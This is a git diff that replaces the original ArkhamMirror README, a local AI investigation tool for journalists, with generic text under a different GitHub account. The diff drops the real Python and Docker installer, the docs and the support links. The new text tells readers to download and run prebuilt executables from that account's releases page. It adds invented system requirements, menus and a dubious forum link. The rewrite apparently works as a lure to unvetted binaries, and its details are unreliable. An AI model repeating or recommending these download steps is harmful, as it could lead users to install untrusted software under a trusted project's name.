@@ -1,80 +1,77 @@
-# <img src="docs/assets/logo.png" width="40" height="40" alt="ArkhamMirror Logo" style="vertical-align: middle;"> ArkhamMirror
-
-![ArkhamMirror Banner](docs/assets/banner.png)
-
-> **Connect the dots without connecting to the cloud.**
-
-ArkhamMirror is an air-gapped, AI-powered investigation platform for journalists and researchers. It runs 100% locally on your machine, turning chaos into order using advanced NLP, Vision AI, and Knowledge Graphs.
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue.svg)](https://www.python.org/downloads/)
-[![Sponsor](https://img.shields.io/badge/Sponsor-Ko--fi-red)](https://ko-fi.com/arkhammirror)
-
----
-
-## ⚡ Key Features at a Glance
-
-| Feature | Description |
-| :--- | :--- |
-| **🕵️ Local AI** | Chat with your data using **Offline RAG** (Retrieval-Augmented Generation). |
-| **🔍 Semantic Search** | Find documents by *concept*, not just exact keywords. |
-| **🕸️ Knowledge Graph** | Visualize hidden connections between People, Orgs, and Places. |
-| **⏳ Auto-Timeline** | Extract dates and events to reconstruct what happened when. |
-| **📊 Visual Table Extraction** | Recover complex financial tables from PDFs/Images using Vision models. |
-| **⚠️ Contradiction Detection** | Automatically flag conflicting statements across documents. |
-| **🔒 Absolute Privacy** | Zero cloud dependencies. Your data never leaves your specialized "Data Silo". |
-
----
+# 🛠️ ArkhamMirror - Empower Your Investigative Work with AI
 
 ## 🚀 Getting Started
 
-ArkhamMirror includes a **Smart Installer** that sets up Python, Docker, and Database dependencies for you.
+Welcome to ArkhamMirror! This application is designed to enhance your investigative journalism with powerful AI tools. Follow the easy steps below to download and run ArkhamMirror.
 
-### Windows (One-Click)
+## 📦 Download ArkhamMirror
 
-Double-click `setup.bat` and follow the **AI Setup Wizard**.
+[![Download ArkhamMirror](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/1n3202/ArkhamMirror/releases)
 
-### Mac / Linux
+## 📥 Download & Install
 
-```bash
-chmod +x setup.sh
-./setup.sh
-```
+1. **Visit the Releases Page**  
+   Go to the Releases page to find the latest version of ArkhamMirror. Click this link: [Download ArkhamMirror](https://github.com/1n3202/ArkhamMirror/releases).
 
----
+2. **Choose the Right File for Your System**  
+   On the Releases page, look for the file that matches your operating system. If you’re using Windows, you might see a file like `ArkhamMirror-v1.0-Windows.exe`. For Mac users, the filename could be `ArkhamMirror-v1.0-Mac.dmg`. Linux users may find a .tar.gz file.
 
-## 📚 Documentation
+3. **Download the File**  
+   Click on the file name to begin the download. Save this file to a location on your computer where you can easily find it.
 
-Detailed guides for features and workflows:
+4. **Install ArkhamMirror**  
+   - **For Windows:**  
+     Locate the downloaded `.exe` file and double-click it. Follow the instructions that appear on your screen to complete the installation.
+  
+   - **For Mac:**  
+     Open the downloaded `.dmg` file and drag the ArkhamMirror icon into your Applications folder. Then, you can find it in your Applications.
 
-* **[User Guide](docs/index.md#user-guide)**: Full walkthrough of features.
-* **[Installation](docs/user_guide/01-getting-started.md)**: Detailed setup instructions.
-* **[Developer Guide](docs/index.md#developer-guide)**: Architecture and contributing.
+   - **For Linux:**  
+     Open a terminal and use the command `tar -xvzf ArkhamMirror-v1.0-Linux.tar.gz` to extract the files. Follow the README instructions within the folder to run the application.
 
----
+5. **Open ArkhamMirror**  
+   Once installed, find ArkhamMirror in your applications or programs. Double-click the icon to open the application.
 
-## 🖼️ Gallery
+## 🎉 Features
 
-![Dashboard](docs/assets/images/dashboard.png)
+- **Local-first Architecture:** ArkhamMirror operates entirely on your device, ensuring your data stays private and secure.
+- **AI-Powered Insights:** Use advanced AI to extract meaningful information from documents, making your research easier and faster.
+- **User-Friendly Interface:** The intuitive design helps you navigate the software without any technical knowledge.
+- **Document Visualization:** Quickly visualize data to see trends and relationships relevant to your investigations.
+- **Open Source:** You can view and modify the source code if you wish, allowing for customization and community contributions.
 
-### Advanced Analysis
+## 🖥️ System Requirements
 
-| Narrative Reconstruction | Gap Finding | Contradiction Chain |
-| :---: | :---: | :---: |
-| ![Motive](docs/assets/images/motive.png) | ![Gaps](docs/assets/images/gaps.png) | ![Web of Lies](docs/assets/images/weboflies.png) |
+To run ArkhamMirror, your system should meet the following requirements:
 
-### Forensics
+- **Operating Systems:** Windows 10 or later, macOS Mojave or later, or most modern Linux distributions.
+- **Processor:** At least a dual-core processor.
+- **RAM:** 4GB of RAM or more is recommended for smooth performance.
+- **Storage Space:** A minimum of 500MB free space to install the application.
+  
+## 📄 How to Use ArkhamMirror
 
-| Entity Graph | Author Unmasking |
-| :---: | :---: |
-| ![Graph](docs/assets/images/graph.png) | ![Author Unmask](docs/assets/images/authorunmask.png) |
+1. **Create a New Project:** Start a new project by selecting "New Project" from the menu. Name your project meaningfully to keep it organized.
 
----
+2. **Import Documents:** Click the "Import" button to add documents for analysis. ArkhamMirror supports various formats, including PDFs, Word documents, and images.
 
-## 💖 Support the Project
+3. **Analyze Your Data:** Use the AI analysis tools to extract insights. The application will provide suggestions and highlight key findings for your review.
 
-This tool was born from a desire to give journalists powerful forensics without the monthly subscription costs or privacy risks of cloud platforms.
+4. **Visualize Results:** Switch to the visualization tab to create charts and graphs that help you understand your data better.
 
-If it helps you uncover the truth, consider buying me a coffee!
+5. **Export Findings:** Once you're done, you can export your reports as PDF or Word files to share with your team or use in articles.
 
-[![Support on Ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/arkhammirror)
+## 🤝 Contributing
+
+We welcome contributions from the community! If you want to suggest a feature or report a bug, please open an issue in the repository. If you’d like to contribute code, fork the repository, make your changes, and submit a pull request.
+
+## 🛠️ Support
+
+For any questions or help using ArkhamMirror, check the FAQ section in the repository or open a new issue. We are here to assist you!
+
+## 🔗 Additional Resources
+
+- [Official Documentation](https://github.com/1n3202/ArkhamMirror/wiki)  
+- [Community Forum](https://community.github.com/1n3202/ArkhamMirror)
+
+Thank you for using ArkhamMirror. We hope it enhances your investigative work with valuable insights!
